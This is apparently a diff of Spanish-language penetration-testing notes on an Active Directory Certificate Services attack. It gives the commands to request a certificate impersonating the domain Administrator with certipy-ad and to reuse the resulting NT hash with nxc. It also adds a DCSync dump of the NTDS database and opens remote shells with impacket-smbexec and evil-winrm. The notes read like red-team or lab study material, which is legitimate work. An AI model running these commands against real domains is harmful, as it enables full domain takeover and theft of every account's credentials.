@@ -111,19 +111,15 @@ NOTA:
 # Solicitar el certificado de autenticación 
 
 Paso 3:
-❯ certipy-ad req -u 'Computer1$' -p 'C0mput3r123!' -dc-ip IP_DC -ca CA_NAME -template 'Template_Name' -upn 'Administrator@domain.corp' -sid '<Target_User_SID>'
+❯ certipy-ad req -u 'Computer1$' -p 'C0mput3r123!' -dc-ip IP_DC -ca CA_NAME -template 'Template_Name' -upn 'Administrator@domain.corp' -sid <Target_User_SID>
 
 	# upn = Usuario a impersonar 
-	# sid = Requerido si hay un SID mismatch error
+	# sid = Requerido si hay un SID mismatch error (SID Del usuario a impersonar 'Administraator')
 	# Ejemplo del SID:
 		S-1-5-21-1496966362-3320961333-4044918980-500
-
-
-❯ impacket-lookupsid domain.corp/user:'P@$$w0rd123!'@IP_DC
-	# Resultado:
-	[*] Domain SID is: S-1-5-21-1496966362-3320961333-4044918980
-	498: ANOMALY\Enterprise Read-only Domain Controllers (SidTypeGroup)
-	500: ANOMALY\Administrator (SidTypeUser)
+		
+	# -dns (OPCIONAL) = Es la IP del DC 
+	# -target (OPCIONAL) = Es el dominio 
 ```
 
 ```bash 
@@ -136,12 +132,14 @@ Paso 4:
 Paso 5:
 # Mirar si se puede ingresar con ese hash 
 ❯ nxc smb IP_DC -u administrator -H be4bf3131851aee9a424c58e02879f6e
+❯ nxc smb IP_DC -u administrator -H be4bf3131851aee9a424c58e02879f6e --ntds    # DCSync 
 ❯ nxc winrm IP_DC -u administrator -H be4bf3131851aee9a424c58e02879f6e
  
 Paso 6:
 # Conectarse al server 
 ❯ impacket-smbexec 'Administrator'@<IP> -hashes LM:NT
 ❯ evil-winrm -i IP_DC -u Administrator 
+
 
 NOTA:
 	- Si no funciona utilizar 'WMIExec2' para la evasión y conexión mediante WMI
